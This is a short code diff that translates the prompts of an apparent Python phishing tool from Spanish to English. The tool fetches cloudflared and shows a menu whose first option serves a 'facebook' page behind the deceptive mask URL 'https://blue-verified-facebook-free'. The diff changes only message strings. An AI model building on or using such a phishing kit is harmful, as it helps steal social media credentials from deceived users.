@@ -301,7 +301,7 @@ def main():
     x=popen("uname -m").read()
     y=popen("uname").read()
     if not os.path.isfile(root+"/.cffolder/cloudflared"):
-        sprint("\n"+info+"Descargando Cloudflare :D ....."+nc)
+        sprint("\n"+info+"Installing Cloudflare"+nc)
         internet()
         system("rm -rf cloudflared cloudflared.tgz")
         if y.find("Linux")!=-1:
@@ -348,7 +348,7 @@ def main():
         slowprint(logo)
         options()
 
-        choose= input(ask+"Seleciona un numero :) > "+nc)
+        choose= input(ask+"Choose Your Numbers :) > "+nc)
         if choose=="1" or choose == "01":
             folder="facebook"
             mask="https://blue-verified-facebook-free"
@@ -618,7 +618,7 @@ def main():
         elif choose=="0":
             pexit()
         else:
-            sprint("\n"+error+"No disponible :v")
+            sprint("\n"+error+"Not Available")
             main()
 
 # Copy website files from custom location
